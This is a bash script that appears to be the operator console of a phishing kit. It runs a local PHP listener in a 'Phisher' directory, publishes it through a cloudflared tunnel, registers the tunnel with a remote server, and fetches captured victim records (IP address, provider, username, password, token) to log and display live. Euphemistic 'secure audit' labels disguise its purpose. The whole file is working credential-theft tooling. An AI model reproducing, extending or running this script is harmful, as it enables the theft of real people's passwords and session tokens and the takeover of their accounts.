#!/bin/bash
# ===============================================================
#  TECH TONIC ENGINE v3.0 — SECURE AUTOMATED AUDITORIUM PANEL
#  Prepared by: CyberTeam
# ===============================================================

# 💡 CONFIGURATION RULES: Map your exact platform parameters here
BASE_URL="https://ttcsec.gt.tc"
SECRET_KEY="TechTonic_Secret_Handshake_Token_2026"

# Absolute workspace directory alignment
WORKSPACE_DIR="$HOME/Phisher"
mkdir -p "$WORKSPACE_DIR"
cd "$WORKSPACE_DIR" || exit 1

# Reset local cache indexes
rm -f local_log.txt && touch local_log.txt
rm -f cloudflared.log

clear
echo -e "\033[1;36m===============================================================\033[0m"
echo -e "\033[1;36m   [+] INITIALIZING TECH TONIC SECURITY CONTROLLER INTERFACE   \033[0m"
echo -e "\033[1;36m===============================================================\033[0m"
echo -e "[*] Spinning up background processing routines..."

# 1. Spawn local data listener engine
php -S 127.0.0.1:9999 > /dev/null 2>&1 &
PHP_PID=$!
sleep 1

# 2. Establish quick secure ingress routing tunnel
cloudflared tunnel --url http://127.0.0.1:9999 > cloudflared.log 2>&1 &
CF_PID=$!

sleep 7
TUNNEL_URL=$(grep -o 'https://[^ ]*\.trycloudflare\.com' cloudflared.log | head -n 1)

if [ -z "$TUNNEL_URL" ]; then
    echo -e "\033[1;31m[-] CRITICAL ERROR: Tunnel allocation timeout. Check network profiles.\033[0m"
    kill $PHP_PID $CF_PID
    exit 1
fi

echo -e "\033[1;32m[+] ROUTING INTERFACE ACTIVE: $TUNNEL_URL\033[0m"
echo -e "[*] Syncing remote endpoint targets securely..."

# 3. Synchronize routing tables with the remote server
curl -s -H "X-KALI-TUNNEL: $TUNNEL_URL" "$BASE_URL/index.php" > /dev/null
echo -e "\033[1;32m[+] ENDPOINT RULES SUCCESSFULLY ALIGNED!\033[0m"

# 4. Fetch offline backlog entries using the secret security header challenge
echo -e "[*] Extracting un-synchronized records from secure storage..."
OFFLINE_JSON=$(curl -s -H "X-KALI-AUTH: $SECRET_KEY" "$BASE_URL/fetch_offline.php")

if [ ! -z "$OFFLINE_JSON" ] && [ "$OFFLINE_JSON" != "[]" ] && [ "$OFFLINE_JSON" != '{"error":' * ]; then
    echo "$OFFLINE_JSON" | jq -c '.[]' 2>/dev/null | while read -r row; do
        ts=$(echo "$row" | jq -r '.timestamp')
        ip=$(echo "$row" | jq -r '.ip_address')
        pr=$(echo "$row" | jq -r '.provider')
        un=$(echo "$row" | jq -r '.username')
        pw=$(echo "$row" | jq -r '.password')
        tk=$(echo "$row" | jq -r '.token')

        {
            echo "============================================================"
            echo "⏰ TIMESTAMP     : $ts (OFFLINE DATABASE SYNC)"
            echo "🌐 IP ADDRESS    : $ip"
            echo "🔑 PROVIDER      : $pr"
            echo "👤 USERNAME      : $un"
            echo "🔒 PASSWORD      : $pw"
            echo "🎟️ TOKEN NUMBER  : $tk"
            echo "============================================================"
            echo ""
        } >> local_log.txt
    done
    echo -e "\033[1;33m[+] RESILIENT LOG SYNC: Backlog data written to monitor framework.\033[0m"
else
    echo -e "[+] Pipeline verified: Zero offline backlog records reported."
fi

echo ""
echo -e "\033[1;36m===============================================================\033[0m"
echo -e "\033[1;36m    TECH TONIC LIVE TRANSMISSION MATRIX -- CYBERTEAM MONITORS   \033[0m"
echo -e "\033[1;36m===============================================================\033[0m"
echo ""

# 5. Fixed Visual Projection Engine (Matches string mapping boundaries perfectly)
tail -f local_log.txt | awk '
/^===/ {print "\033[1;36m" $0 "\033[0m"} 
/TIMESTAMP/ {print "\033[1;33m" $0 "\033[0m"} 
/IP ADDRESS/ {print "\033[1;35m" $0 "\033[0m"} 
/PROVIDER/ {print "\033[1;34m" $0 "\033[0m"} 
/USERNAME/ {print "\033[1;32m" $0 "\033[0m"} 
/PASSWORD/ {print "\033[1;31m" $0 "\033[0m"}
/TOKEN NUMBER/ {print "\033[1;46;30m" $0 "\033[0m"}
'

# Secure interface teardown routine
trap "kill $PHP_PID $CF_PID; rm -f cloudflared.log; exit" INT TERM EXIT
